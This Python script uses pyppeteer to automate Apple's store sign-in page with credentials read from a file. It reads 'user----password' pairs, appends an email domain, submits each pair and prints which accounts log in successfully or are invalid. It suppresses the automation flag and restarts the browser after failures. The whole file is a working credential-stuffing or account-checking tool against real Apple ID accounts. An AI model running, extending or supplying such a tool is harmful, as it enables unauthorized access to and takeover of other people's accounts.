import asyncio
import time
from pyppeteer import launch
import nest_asyncio
from pyvirtualdisplay import Display
import sys
import logging


nest_asyncio.apply()


async def appleLogin(url, fileName, endFix):
    display = Display(visible=0, size=(800, 800))
    display.start()
    browser = await launch(
        options={
            'headless': False,
            'ignoreDefaultArgs': ['--enable-automation'],
            'args': ['--no-sandbox', '--disable-gpu', '--enable-file-cookies'],
        })
    page = await browser.newPage()
    file = open(fileName)
    line = file.readline()  # 调用文件的 readline()方法
    if line == None:
        return
    while line:
        strlist = line.split('----')
        username = strlist[0] + endFix
        password = strlist[1].split('\n')[0]
        start = time.perf_counter()
        res = 1
        try:
            res = await test(page, username, password, url)
        except Exception as e:
            print("error", username, "----", password)
            logging.exception(e)
        end = time.perf_counter()
        yongshi = end - start
        print("total==============", yongshi)

        if (res == 1 or (yongshi > 20)):
            try:
                await page.close()
                await context.close()
                await browser.close()
            except:
                print("reInit failed")
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
        line = file.readline()


async def test(page, username, password, url):
    await page.goto(url, {'waitUntil': 'domcontentloaded'})
    await page.type('input[name="appleId"]', username)
    await page.type('input[name="password"]', password)
    await page.click('#signInButtonId')
    timeout = time.time() + 5
    while (True):
        time.sleep(0.3)
        if time.time() > timeout:
            flag = 1
            break
        try:
            element = await page.querySelector('div[role="alert"]')
            if element != None:
                flag = 2
                print("账号无效", username, "----", password)
                return 2
        except Exception as e:
            logging.exception(e)
            print("success", username, "----", password)
            return 1
    await page.waitForNavigation()
    timeout = time.time() + 20
    while (True):
        time.sleep(0.3)
        if time.time() > timeout:
            flag = 1
            break
        try:
            element = await page.querySelector(".ac-ls-dropdown-select")
            if element != None:
                flag = 3
                break
            element = await page.querySelector('div[role="alert"]')
            if element != None:
                flag = 2
                break
        except Exception as e:
            logging.exception(e)
            break
    if flag == 1:
        print("时间过长", username, "----", password)
    elif flag == 2:
        print("账号无效", username, "----", password)
    elif flag == 3:
        print("success", username, "----", password)
        return 1
    return 2

if __name__ == '__main__':
    file = sys.argv[1]
    endFix = sys.argv[2]
    # file = "3333.txt"
    # endFix = "@gmail.com"
    url = "https://secure2.store.apple.com/shop/signIn?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2lwaG9uZS0xMi98MWFvc2E1NmIyYjExY2Y5ZTIxNmVlOGM0MjUyZWU1YzRhMTEzZWJjMDE1NTI&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2lwaG9uZS0xMi98MWFvc2E1NmIyYjExY2Y5ZTIxNmVlOGM0MjUyZWU1YzRhMTEzZWJjMDE1NTI"
    loop = asyncio.get_event_loop()
    loop.run_until_complete(appleLogin(url, file, endFix))
